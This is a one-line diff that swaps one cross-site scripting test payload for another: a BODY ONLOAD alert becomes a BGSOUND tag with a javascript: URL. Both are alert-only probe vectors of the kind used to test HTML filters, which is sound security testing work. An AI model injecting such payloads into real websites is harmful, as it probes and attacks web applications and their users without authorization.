@@ -1,1 +1,1 @@
-<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
